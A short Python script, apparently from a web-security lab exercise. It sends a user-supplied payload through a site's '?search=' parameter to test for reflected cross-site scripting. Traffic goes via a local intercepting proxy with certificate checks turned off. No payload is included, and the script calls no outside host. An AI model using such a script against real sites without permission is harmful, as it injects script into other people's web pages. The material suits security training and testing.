import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_alert(url,src,s):
    uri = "?search="
    r = s.get(url+uri+src,verify=False, proxies=proxies)
    print(url+uri+src)


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        src = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s css alert' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    exploit_alert(url,src,s)